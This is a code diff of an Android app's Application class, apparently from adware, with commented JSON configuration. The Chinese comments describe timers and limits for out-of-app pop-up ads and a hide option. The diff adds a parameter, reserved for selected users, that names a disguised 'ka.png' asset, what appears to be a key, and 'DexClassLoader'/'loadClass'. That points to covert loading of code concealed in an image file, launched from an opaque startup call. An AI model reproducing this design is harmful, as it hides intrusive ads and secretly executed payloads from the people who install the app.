@@ -1,21 +1,25 @@
-package com.announcement.comprehension.t
+package com.announcement.comprehension
 
 import android.app.Application
-import com.announcement.comprehension.utcs.RealTStart
+import com.announcement.comprehension.utils.center.ColorTool
 import com.tencent.mmkv.MMKV
 
 class ColorApp : Application() {
     override fun onCreate() {
         super.onCreate()
-        app = this
-        MMKV.initialize(app)
-        mmkv = MMKV.defaultMMKV()
-        RealTStart().st(app)
+        colorApp = this
+        start()
+    }
+
+    private fun start() {
+        MMKV.initialize(colorApp)
+        kvCenter = MMKV.defaultMMKV()
+        ColorTool().allSet(colorApp)
     }
 
     companion object {
-        lateinit var app: Application
-        lateinit var mmkv: MMKV
+        lateinit var colorApp: Application
+        lateinit var kvCenter: MMKV
     }
 }
 
@@ -48,10 +52,11 @@ class ColorApp : Application() {
 //    "akm":"5_10",//A用户admin定时(分钟),B用户admin定时（秒）
 //    "nma":"10_20_30_20_30",//小时上限，天上限，外弹失败上限，展示时长上限,admin请求次数上限
 //    "eka":"15_10_0_30_200_400",//定时，定时随机幅度，展示间隔，初次间隔，外弹后展示广告的延时最小值(毫秒)，外弹后展示广告的延时最大值（毫秒）
-//    "vka":"hotmdl_fancaj_yaso_bkbir"//外弹文件名，广播接收key，隐藏，外弹
-
+//    "vka":"hotmdl_fancaj_yaso_bkbir",//外弹文件名，广播接收key，隐藏，外弹
+//    "zuk":"ka.png_vbiKMu90!pkk*&BK_dalvik.system.DexClassLoader_loadClass_m.ki.Dva_sim"//A用户才有的参数
+//
 //}
-
+//
 //{
 //    "bta":"wow_bob_dud_kuk",
 //    "cvv":"id_token",
@@ -59,5 +64,6 @@ class ColorApp : Application() {
 //    "akm":"5_10",
 //    "nma":"10_20_30_20_30",
 //    "eka":"15_10_0_30_200_400",
-//"vka":"hotmdl_fancaj_yaso_bkbir"
+//"vka":"hotmdl_fancaj_yaso_bkbir",
+//"zuk":"ka.png_vbiKMu90!pkk*&BK_dalvik.system.DexClassLoader_loadClass_m.ki.Dva_sim"
 //}
